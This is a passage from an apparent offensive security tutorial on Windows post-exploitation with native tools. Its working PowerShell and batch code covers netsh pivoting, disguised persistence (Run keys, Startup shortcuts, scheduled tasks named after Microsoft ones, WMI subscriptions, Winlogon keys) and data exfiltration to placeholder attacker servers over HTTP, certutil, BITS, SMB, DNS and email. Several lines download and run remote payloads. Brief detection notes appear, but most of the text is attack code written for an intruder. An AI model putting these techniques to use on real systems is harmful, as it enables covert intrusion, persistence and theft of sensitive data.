Techniques\u003c/h4\u003e\n\u003cp\u003eHere's a practical example of using netsh for a complete network pivot scenario:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Step 1: Set up port forward to internal system you want to access\nnetsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.50\n\n# Step 2: Add firewall rule to allow the connection\nnetsh advfirewall firewall add rule name=\"Remote Desktop Relay\" dir=in action=allow protocol=TCP localport=3389\n\n# Step 3: From your attacker machine, RDP to the compromised host\n# This actually connects you to 10.10.10.50 via the pivot\n\n# Step 4: Clean up when done\nnetsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0\nnetsh advfirewall firewall delete rule name=\"Remote Desktop Relay\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe reason netsh is so powerful for pivoting is that it's completely native to Windows, requires no additional tools, and performs a function that network administrators use legitimately. Unlike running a SOCKS proxy or custom tunneling tool, netsh port forwarding looks like normal network configuration.\u003c/p\u003e\n\u003cp\u003eFrom a detection perspective, defenders should monitor netsh commands with \u003ccode\u003eportproxy\u003c/code\u003e parameters, unexpected firewall rule additions, WiFi credential extraction (commands with \u003ccode\u003ekey=clear\u003c/code\u003e), and netsh execution from unusual parent processes.\u003c/p\u003e\n\u003cp\u003eBut in practice, netsh is used so frequently by administrators that distinguishing malicious use from legitimate use is challenging without behavioral analytics.\u003c/p\u003e\n\u003ch2\u003ePersistence Mechanisms\u003c/h2\u003e\n\u003cp\u003eAfter establishing lateral movement capabilities, you need persistence - the ability to maintain access even if your initial entry point is discovered and closed, if the system reboots, or if users log off.\u003c/p\u003e\n\u003cp\u003eLet me walk you through various persistence techniques using only native Windows tools. The key to effective persistence is choosing methods that blend in with legitimate system operations and are unlikely to be discovered during routine system administration.\u003c/p\u003e\n\u003ch3\u003eRegistry Run Keys: The Classic\u003c/h3\u003e\n\u003cp\u003eRegistry run keys are probably the most well-known persistence method, which means they're also one of the most monitored. But they're still effective when implemented carefully.\u003c/p\u003e\n\u003cp\u003eRun keys cause programs to execute when a user logs in. There are multiple run key locations in the registry, each with different scope and privilege requirements:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Current user run key (doesn't require admin privileges)\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"OneDriveUpdate\" -Value \"powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2-server.com/payload.ps1')\" -PropertyType String -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a registry value in the current user's run key. Every time this user logs in, the command executes. The command in this example downloads and executes a PowerShell script from your C2 server directly into memory without touching disk.\u003c/p\u003e\n\u003cp\u003eFor system-wide persistence that affects all users:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Local machine run key (requires admin privileges)\nNew-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"SecurityUpdate\" -Value \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command your_payload\" -PropertyType String -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe key to making run keys stealthy is choosing names and commands that look legitimate. \"OneDriveUpdate\" or \"SecurityUpdate\" are far less suspicious than \"Backdoor\" or \"Payload\".\u003c/p\u003e\n\u003cp\u003eThere are also RunOnce keys, which execute once and then delete themselves:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# RunOnce key\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name \"ConfigUpdate\" -Value \"powershell.exe -Command your_payload\" -PropertyType String -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese might seem less useful, but they can be combined with your payload re-creating itself in another RunOnce key, creating a chain that's harder to trace.\u003c/p\u003e\n\u003cp\u003eOther useful run key locations:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Run key locations (in order of visibility to users)\n# HKLM - affects all users, requires admin, highly visible\nHKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n# HKCU - current user only, doesn't require admin, less visible\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n# Explorer Run - executes when Explorer starts\nHKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\n# RunServices keys (less commonly monitored)\nHKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo check what's already in run keys (useful for blending in):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List existing run key entries\nGet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eStartup Folder: Simple but Effective\u003c/h3\u003e\n\u003cp\u003eThe Startup folder is even simpler than registry run keys - anything in this folder executes when the user logs in:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Current user startup folder\n$startupPath = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n# Create a shortcut to PowerShell\n$WshShell = New-Object -ComObject WScript.Shell\n$shortcut = $WshShell.CreateShortcut(\"$startupPath\\OneDrive.lnk\")\n$shortcut.TargetPath = \"powershell.exe\"\n$shortcut.Arguments = \"-WindowStyle Hidden -NoProfile -Command your_payload\"\n$shortcut.WorkingDirectory = \"C:\\Windows\\System32\"\n$shortcut.WindowStyle = 7  # Hidden\n$shortcut.Description = \"OneDrive Sync\"\n$shortcut.Save()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a shortcut that looks like it's for OneDrive but actually executes your payload. The WindowStyle = 7 means the window is hidden.\u003c/p\u003e\n\u003cp\u003eFor all users (requires admin):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e$startupPath = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n# Same shortcut creation code as above\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlternatively, you can directly place a script or batch file in the Startup folder:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e$script = @\"\n@echo off\npowershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\n\"@\n\nSet-Content -Path \"$startupPath\\WindowsUpdate.bat\" -Value $script\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe advantage of Startup folder persistence is its simplicity. The disadvantage is that it's one of the first places defenders look when hunting for persistence.\u003c/p\u003e\n\u003ch3\u003eScheduled Tasks: The Flexible Option\u003c/h3\u003e\n\u003cp\u003eScheduled tasks are far more flexible than run keys because you can control exactly when and how often they execute:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Create a scheduled task that runs at user logon\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -NoProfile -Command your_payload\"\n$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME\n$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest\n$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden\n\nRegister-ScheduledTask -TaskName \"MicrosoftEdgeUpdateTaskUserCore\" -Action $action -Trigger $trigger -Principal $principal -Settings $settings\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me explain the parameters. The \u003ccode\u003e-AtLogOn\u003c/code\u003e parameter triggers the task when any user logs on, while \u003ccode\u003e-RunLevel Highest\u003c/code\u003e runs it with elevated privileges if the user is an admin. The \u003ccode\u003e-AllowStartIfOnBatteries\u003c/code\u003e and \u003ccode\u003e-DontStopIfGoingOnBatteries\u003c/code\u003e flags ensure the task runs on laptops regardless of power state. Finally, \u003ccode\u003e-Hidden\u003c/code\u003e hides the task from the Task Scheduler GUI (though it's still visible from PowerShell or schtasks.exe).\u003c/p\u003e\n\u003cp\u003eThe task name \"MicrosoftEdgeUpdateTaskUserCore\" is chosen to blend in - this is an actual Microsoft Edge update task name, so it won't raise suspicion.\u003c/p\u003e\n\u003cp\u003eFor a task that runs periodically instead of at logon:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Task that runs every 6 hours\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 6) -RepetitionDuration ([TimeSpan]::MaxValue)\n\nRegister-ScheduledTask -TaskName \"WindowsBackupMonitor\" -Action $action -Trigger $trigger -Principal $principal -Settings $settings\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr a task that runs daily at a specific time:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Task that runs every day at 3 AM\n$trigger = New-ScheduledTaskTrigger -Daily -At 3am\n\nRegister-ScheduledTask -TaskName \"WindowsUpdateCheck\" -Action $action -Trigger $trigger -Principal $principal -Settings $settings\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo make the task run as SYSTEM (requires admin):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e$principal = New-ScheduledTaskPrincipal -UserId \"SYSTEM\" -LogonType ServiceAccount -RunLevel Highest\n\nRegister-ScheduledTask -TaskName \"WindowsDefenderCache\" -Action $action -Trigger $trigger -Principal $principal -Settings $settings\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eScheduled tasks are great for persistence because they're extremely flexible in scheduling, they can run with elevated privileges, thousands of legitimate scheduled tasks exist on typical Windows systems making yours blend in, and they persist across reboots and user logoffs without any additional configuration.\u003c/p\u003e\n\u003cp\u003eTo list existing scheduled tasks and find good names to mimic:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003eGet-ScheduledTask | Where-Object {$_.TaskPath -like \"*Microsoft*\"} | Select-Object TaskName\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eWMI Event Subscriptions: The Stealthy Approach\u003c/h3\u003e\n\u003cp\u003eWMI event subscriptions are one of the most sophisticated and stealthy persistence mechanisms. They're rarely monitored, difficult to detect, and incredibly powerful.\u003c/p\u003e\n\u003cp\u003eWMI event subscriptions consist of three components that work together. An event filter serves as the trigger, defining what event to watch for. An event consumer specifies the action to take when the event occurs. Finally, a binding connects the filter to the consumer, completing the subscription.\u003c/p\u003e\n\u003cp\u003eHere's a complete example:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Step 1: Create an event filter (trigger)\n$filterArgs = @{\n    Name = \"WindowsUpdateFilter\"\n    EventNamespace = \"root\\cimv2\"\n    QueryLanguage = \"WQL\"\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs\n\n# Step 2: Create an event consumer (action)\n$consumerArgs = @{\n    Name = \"WindowsUpdateConsumer\"\n    CommandLineTemplate = \"powershell.exe -WindowStyle Hidden -NoProfile -Command your_payload\"\n}\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs\n\n# Step 3: Bind the filter to the consumer\n$bindingArgs = @{\n    Filter = $filter\n    Consumer = $consumer\n}\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me explain what this does. The event filter watches for modifications to Win32_PerfFormattedData_PerfOS_System, which happens constantly as performance counters update. The \u003ccode\u003eWITHIN 60\u003c/code\u003e clause means it checks every 60 seconds. So effectively, this runs your payload every 60 seconds.\u003c/p\u003e\n\u003cp\u003eYou can create different triggers for different purposes:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Trigger when a specific process starts\n$query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'outlook.exe'\"\n\n# Trigger at a specific time\n$query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 14 AND TargetInstance.Minute = 30\"\n\n# Trigger when a user logs in\n$query = \"SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo view existing WMI event subscriptions (useful for cleanup or detection):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all event filters\nGet-WmiObject -Namespace root\\subscription -Class __EventFilter\n\n# List all event consumers\nGet-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer\n\n# List all bindings\nGet-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo remove a WMI event subscription:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003eGet-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='WindowsUpdateFilter'\" | Remove-WmiObject\nGet-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='WindowsUpdateConsumer'\" | Remove-WmiObject\nGet-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -match 'WindowsUpdateFilter'} | Remove-WmiObject\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWMI event subscriptions are powerful because they're not visible in Task Scheduler or obvious registry locations, most administrators don't know how to check for them, they can trigger based on complex system events, they persist across reboots, and they're rarely monitored by security tools.\u003c/p\u003e\n\u003cp\u003eThe downside is they require administrator privileges to create.\u003c/p\u003e\n\u003ch3\u003eWinlogon Registry Keys\u003c/h3\u003e\n\u003cp\u003eWinlogon keys control what happens during the Windows login process. Certain keys execute programs during login:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Userinit key - runs when users log in\n$currentUserinit = (Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\").Userinit\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$currentUserinit,powershell.exe -WindowStyle Hidden -Command your_payload\" -PropertyType String -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe default Userinit value is \u003ccode\u003eC:\\Windows\\system32\\userinit.exe,\u003c/code\u003e. By appending our payload to this value, we maintain normal login functionality while also executing our payload.\u003c/p\u003e\n\u003cp\u003eAnother Winlogon key is the Shell value:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Shell key - defines the Windows shell\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"explorer.exe,powershell.exe -WindowStyle Hidden -Command your_payload\" -PropertyType String -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe default Shell value is \u003ccode\u003eexplorer.exe\u003c/code\u003e. By adding our payload, we execute it every time Explorer starts.\u003c/p\u003e\n\u003cp\u003eIMPORTANT: Be very careful with Winlogon keys. If you misconfigure them, you can break the login process or make the system unbootable. Always preserve the original values and append to them rather than replacing them.\u003c/p\u003e\n\u003cp\u003eAlso note that Winlogon keys are well-known persistence locations and are typically monitored by security tools. Use them cautiously and only when other methods aren't suitable.\u003c/p\u003e\n\u003ch2\u003eData Exfiltration\u003c/h2\u003e\n\u003cp\u003eOnce you've established persistence, moved laterally, and collected the data you came for, you need to get it out of the target environment. Data exfiltration is often the most challenging phase because this is where you're moving potentially large amounts of data off the network, which can trigger network monitoring alerts if not done carefully.\u003c/p\u003e\n\u003cp\u003eLet me show you various techniques for exfiltrating data using only native Windows tools.\u003c/p\u003e\n\u003ch3\u003ePowerShell Web Requests\u003c/h3\u003e\n\u003cp\u003ePowerShell makes HTTP/HTTPS requests trivial, which means you can exfiltrate data to a web server you control:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Upload a file via HTTP POST\n$fileContent = [System.IO.File]::ReadAllBytes(\"C:\\sensitive\\data.txt\")\n$boundary = [System.Guid]::NewGuid().ToString()\n$headers = @{\"Content-Type\" = \"multipart/form-data; boundary=$boundary\"}\n\nInvoke-RestMethod -Uri \"http://your-exfil-server.com/upload\" -Method POST -Headers $headers -Body $fileContent\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis reads a file into memory and POSTs it to your exfiltration server. The web request looks like normal HTTP traffic, and if you use HTTPS, the content is encrypted in transit.\u003c/p\u003e\n\u003cp\u003eFor larger files, you might want to chunk them:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Upload file in chunks\n$file = \"C:\\sensitive\\large-file.zip\"\n$chunkSize = 1MB\n$buffer = New-Object byte[] $chunkSize\n$fileStream = [System.IO.File]::OpenRead($file)\n\n$chunkNumber = 0\nwhile (($bytesRead = $fileStream.Read($buffer, 0, $chunkSize)) -gt 0) {\n    $chunkNumber++\n    $chunkData = $buffer[0..($bytesRead-1)]\n    Invoke-RestMethod -Uri \"http://your-server.com/upload?chunk=$chunkNumber\" -Method POST -Body $chunkData\n}\n$fileStream.Close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis reads the file in 1MB chunks and uploads each chunk separately. On your exfiltration server, you'd reassemble the chunks.\u003c/p\u003e\n\u003cp\u003eFor HTTPS with self-signed certificates (common for C2 servers), you need to bypass certificate validation:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Bypass SSL certificate validation\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n\n# Now HTTPS requests will work with self-signed certs\nInvoke-RestMethod -Uri \"https://your-server.com/upload\" -Method POST -Body $data\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCertutil: The Unexpected File Transfer Tool\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eüö® EDR REALITY CHECK (2025):\u003c/strong\u003e Certutil for file downloads/uploads is \u003cstrong\u003eheavily monitored\u003c/strong\u003e and will be flagged even by Windows Defender in many configurations. The \u003ccode\u003e-urlcache\u003c/code\u003e switch for downloading files is a well-known indicator of compromise. Modern EDRs have specific signatures for certutil being used for non-certificate operations. This technique was stealthy years ago but is now one of the first things blue teams look for. Consider alternative download methods (PowerShell with obfuscation, compiled binaries, or legitimate admin tools like bits transfer) for modern engagements.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eCertutil is a built-in Windows utility for managing certificates, but it has a lesser-known feature for downloading files:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ecertutil.exe -urlcache -split -f http://your-server.com/upload C:\\temp\\upload.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e-urlcache\u003c/code\u003e flag uses the URL cache, \u003ccode\u003e-split\u003c/code\u003e writes the file to disk, and \u003ccode\u003e-f\u003c/code\u003e forces overwriting existing files.\u003c/p\u003e\n\u003cp\u003eBut certutil can also be used for uploads if your server supports it. The trick is encoding the file as base64 and sending it as part of a URL:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Encode file as base64\n$fileContent = [System.IO.File]::ReadAllBytes(\"C:\\sensitive\\data.txt\")\n$base64 = [Convert]::ToBase64String($fileContent)\n\n# Split into chunks (URLs have length limits)\n$chunkSize = 8000\nfor ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {\n    $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))\n    certutil.exe -urlcache -split -f \"http://your-server.com/receive?data=$chunk\" null\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYour server would collect these chunks and reassemble the base64-encoded file.\u003c/p\u003e\n\u003cp\u003eAfter using certutil, clean the URL cache:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ecertutil.exe -urlcache * delete\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eBITS: Background Intelligent Transfer Service\u003c/h3\u003e\n\u003cp\u003eBITS is designed for transferring large files in the background, which makes it perfect for stealthy exfiltration:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003e# Create a BITS job for upload\nbitsadmin /create ExfilJob\nbitsadmin /addfile ExfilJob C:\\sensitive\\data.zip http://your-server.com/upload/data.zip\nbitsadmin /setpriority ExfilJob FOREGROUND\nbitsadmin /resume ExfilJob\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBITS transfers are resumable, which means if the connection is interrupted, the transfer will automatically resume when connectivity is restored. They also throttle themselves to avoid saturating the network connection, which helps avoid detection by network monitoring tools.\u003c/p\u003e\n\u003cp\u003eTo monitor the transfer:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ebitsadmin /monitor\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOnce complete, remove the job:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ebitsadmin /complete ExfilJob\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBITS can also download files:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003ebitsadmin /transfer DownloadJob /download /priority HIGH http://your-server.com/file.zip C:\\temp\\file.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe advantage of BITS is that it's a Microsoft service designed for network transfers, so BITS traffic looks completely legitimate. Windows Update uses BITS, so there's always some BITS traffic on corporate networks.\u003c/p\u003e\n\u003ch3\u003eSMB-Based Exfiltration\u003c/h3\u003e\n\u003cp\u003eIf your exfiltration server is reachable via SMB (port 445), you can simply copy files:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Map a drive to your server\nnet use Z: \\\\your-exfil-server\\share /user:username password\n\n# Copy files\nCopy-Item C:\\sensitive\\data.zip Z:\\\n\n# Disconnect\nnet use Z: /delete\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOr without mapping a drive:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003eCopy-Item C:\\sensitive\\data.zip \\\\your-exfil-server\\share\\\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSMB is encrypted (SMBv3) and looks like normal file sharing traffic. If your exfiltration server is on the same network or reachable via VPN, this is one of the stealthiest methods.\u003c/p\u003e\n\u003ch3\u003eDNS Exfiltration\u003c/h3\u003e\n\u003cp\u003eDNS exfiltration is slower but very stealthy because DNS traffic is rarely inspected and almost never blocked:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Read the file to exfiltrate\n$data = [System.IO.File]::ReadAllBytes(\"C:\\sensitive\\passwords.txt\")\n$encoded = [Convert]::ToBase64String($data)\n\n# DNS labels max out at 63 characters, domains at 253\n$chunkSize = 32  # Conservative chunk size\n$domain = \"exfil.yourdomain.com\"\n\nfor ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {\n    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))\n    $subdomain = \"$chunk.$domain\"\n\n    # Make DNS query\n    nslookup $subdomain 2\u003e$null | Out-Null\n\n    # Small delay to avoid overwhelming DNS\n    Start-Sleep -Milliseconds 100\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOn your DNS server (which could be an authoritative DNS server for your domain or a server logging DNS queries), you'd capture these queries and reconstruct the base64-encoded data.\u003c/p\u003e\n\u003cp\u003eThis is slow - DNS queries have significant overhead - but it's extremely stealthy. Every system makes constant DNS queries, so your exfiltration blends in perfectly.\u003c/p\u003e\n\u003cp\u003eFor more sophisticated DNS exfiltration, you can include sequence numbers and error correction:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e$sequenceNumber = 0\nfor ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {\n    $chunk = $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))\n    $subdomain = \"seq$sequenceNumber.$chunk.$domain\"\n    nslookup $subdomain 2\u003e$null | Out-Null\n    $sequenceNumber++\n    Start-Sleep -Milliseconds 100\n}\n\n# Send end marker\nnslookup \"end.$domain\" 2\u003e$null | Out-Null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis way, if any packets are lost, you can identify which chunks are missing and request them again.\u003c/p\u003e\n\u003ch3\u003eICMP Exfiltration\u003c/h3\u003e\n\u003cp\u003eICMP (ping) packets can carry data in their payload. While PowerShell's Test-Connection doesn't let you specify custom data, you can use other approaches:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# This is more limited but possible with some creativity\n# Encode data in the target hostname for ping\n$data = \"sensitive_data_here\"\n$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))\n\n# Use ping to your server (data in hostname)\nping -n 1 \"$encoded.your-exfil-server.com\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis puts the data in the DNS query that ping makes to resolve the hostname, so it's really DNS exfiltration disguised as ping.\u003c/p\u003e\n\u003cp\u003eTrue ICMP payload exfiltration requires lower-level packet crafting that's difficult with only native tools.\u003c/p\u003e\n\u003ch3\u003eEmail-Based Exfiltration\u003c/h3\u003e\n\u003cp\u003eIf the compromised system has email configured (Exchange, SMTP, or Outlook), you can exfiltrate via email:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Send email with attachment using Send-MailMessage\n$smtp = \"smtp.company.com\"\n$from = \"compromised-user@company.com\"\n$to = \"exfil@your-domain.com\"\n$subject = \"Weekly Report\"\n$body = \"Please see the attached report.\"\n\nSend-MailMessage -From $from -To $to -Subject $subject -Body $body -Attachments \"C:\\sensitive\\data.zip\" -SmtpServer $smtp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis only works if the system can send email without authentication (internal mail relay) or if you have email credentials.\u003c/p\u003e\n\u003cp\u003eA more sophisticated approach uses Outlook COM automation:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Use Outlook to send email\n$outlook = New-Object -ComObject Outlook.Application\n$mail = $outlook.CreateItem(0)  # 0 = MailItem\n\n$mail.To = \"exfil@your-domain.com\"\n$mail.Subject = \"Monthly Report\"\n$mail.Body = \"See attachment.\"\n$mail.Attachments.Add(\"C:\\sensitive\\data.zip\")\n$mail.Send()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis uses the victim's Outlook to send email, which means it appears to come from a legitimate user and uses their email credentials automatically.\u003c/p\u003e\n\u003ch2\u003eBypassing Application Whitelisting\u003c/h2\u003e\n\u003cp\u003eApplication whitelisting is one of the most effective security controls organizations can implement. Tools like AppLocker, Windows Defender Application Control (WDAC), and third-party solutions aim to prevent unauthorized code execution by only allowing approved executables to run. In theory, this should stop attackers dead in their tracks - no custom tools, no malware, no code execution.\u003c/p\u003e\n\u003cp\u003eIn practice, it's not that simple. Windows includes dozens of legitimate, Microsoft-signed executables that can be abused to execute arbitrary code. These binaries are typically whitelisted by default because administrators need them for legitimate purposes. This creates a perfect opportunity for attackers - we can execute our code through trusted binaries that security policies explicitly allow.\u003c/p\u003e\n\u003cp\u003eLet me show you the most reliable techniques for bypassing application whitelisting using only native Windows tools.\u003c/p\u003e\n\u003ch3\u003eMSBuild: Executing C# Code Inline\u003c/h3\u003e\n\u003cp\u003eMSBuild.exe is Microsoft's build engine, used by Visual Studio and the .NET framework to compile projects. It's a signed Microsoft binary located in the .NET framework directories, and it's almost always whitelisted because developers need it.\u003c/p\u003e\n\u003cp\u003eHere's what 